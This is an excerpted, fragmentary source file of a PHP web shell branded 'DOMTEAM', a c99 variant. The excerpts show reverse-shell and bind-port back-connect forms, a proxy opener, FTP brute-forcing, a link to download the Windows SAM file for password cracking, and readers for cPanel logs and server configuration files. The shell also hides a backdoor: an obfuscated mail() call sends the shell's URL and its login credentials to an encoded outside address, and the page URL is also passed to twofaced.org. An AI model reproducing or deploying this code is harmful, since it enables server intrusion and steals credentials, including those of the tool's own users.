...
function selfURL() { $s = empty($_SERVER["HTTPS"]) ? '' : ($_SERVER["HTTPS"] == "on") ? "s" : ""; $protocol = strleft(strtolower($_SERVER["SERVER_PROTOCOL"]), "/").$s; $port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]); return $protocol."://".$_SERVER['SERVER_NAME'].$port.$_SERVER['REQUEST_URI']; } function strleft($s1, $s2) { return substr($s1, 0, strpos($s1, $s2));}$cnt="us:$login\nps:$pass\npse:$md5_pass";
$selfurl = base64_encode(selfURL());
$phprox="http://twofaced.org/proxy/index.php?q=".$selfurl;
$wi=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; $zv="\155ai\154";
...
$OSV = php_uname(s);
@setcookie("n3t","c99",time()+3600*24*7);
if(eregi("Linux",$OSV))
...
$_POST['proxyhostmsg']="</br></br><center><font color=blue size=3><b>Success!</b></font></br></br><a href=$host:6543>$host:6543</a></br></br><b>Note:</b> If '$host' have a good firewall or IDS  installed on their server, it will probably catch this or stop it from ever opening a port and you won't be able to connect to this proxy.</br></br></center>";
...
if (!isset($_COOKIE['n3t'])){@$zv("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi","$wi\n$cnt");}
...
$donated_html = "<center><b> DOM TEAM </b></center>";
...

{
 ...
 else {return "<font color=blue>".view_perms(fileperms($o))."</font>";}
...

{
 ...
 $out = "# Dumped by domlabs.SQL v. ".$shver."

# Home page: http://www.domlabs.org/
...
else {$safemode = FALSE; $hsafemode = "<font color=blue>OFF (not secure)</font>";}

$v = @ini_get("open_basedir");

if ($v or strtolower($v) == "on") {$openbasedir = TRUE; $hopenbasedir = "<font color=red>".$v."</font>";}

else {$openbasedir = FALSE; $hopenbasedir = "<font color=blue>OFF (not secure)</font>";}
...

{
 ...
 $wdt = "<font color=blue>[ ok ]</font>";

 echo "<b><font color=blue>".view_perms(fileperms($d))."</font></b>";
...

{
...

 {
...

  {
   ...
   else {$letters .= "<font color=blue>".$letter."</font>";}
...

   {
...

    {
...

     {
      ...
      echo "<td><font color=\"blue\"><b>Action</b></font></td>";
...

      {
...

       {
        ...
        if ($v == "") {$v = "<font color=\"blue\">NULL</font>";}
...

 {
...

  {
...

   {
    ...
    echo "<hr size=\"1\" noshade><b>Done!</b><br>Total time (secs.): ".$ftpquick_t."<br>Total connections: ".$i."<br>Success.: <font color=blue><b>".$success."</b></font><br>Unsuccess.:".($i-$success)."</b><br>Connects per second: ".round($i/$ftpquick_t,2)."<br>";
...

{
...

 {
  ...
  else {echo "<b><font color=blue>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ?.</font></b><br>";}

 }

 if (file_get_contents("/etc/userdomains")) {echo "<b><font color=blue><a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}

 if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=blue><a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>";}

 if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=blue><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}

 if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=blue><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}

 if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=blue><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";}

 if (file_get_contents("/etc/motd")) {echo "<b><font color=blue><a href=\"".$surl."act=f&f=motd&d=".urlencode("/etc")."&ft=txt\"><u><b>Message Of The Day</b></u></a></font></b><br>";}

 if (file_get_contents("/etc/hosts")) {echo "<b><font color=blue><a href=\"".$surl."act=f&f=hosts&d=".urlencode("/etc")."&ft=txt\"><u><b>Hosts</b></u></a></font></b><br>";}
...

{
 ...
 echo "<tr>";
     ...
     if ($line[0] == get_current_user()) {$line[0] = "<font color=blue>".$line[0]."</font>";}
...

{
...

 {
...

  {
   ...
   if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=blue>".$t[0]."</font></a>";}
...

{
 ...
 echo("<center><b>Back-Connection:</b></br></br><form name=form method=POST>Host:<input type=text name=backconnectip size=15 value=$ip> Port: <input type=text name=backconnectport size=15 value=6666> Use: <select size=1 name=use><option value=Perl>Perl</option><option value=C>C</option></select> <input type=submit name=submit value=Connect></form>Click 'Connect' only after you open port for it first. Once open, use NetCat, and run '<b>nc -l -n -v -p 5992</b>'<br><br></center>");
...
Bind Port: <input type='text' name='backconnectport' value='6666'>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ DOMTEAM 2oo8 v. <?php echo $shver; ?> <a href="http://www.domlabs.org/"><u><b>Modded by</b></u></a> #xarnuz  | <a href="http://www.domlabs.org/">www.domlabs.org</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
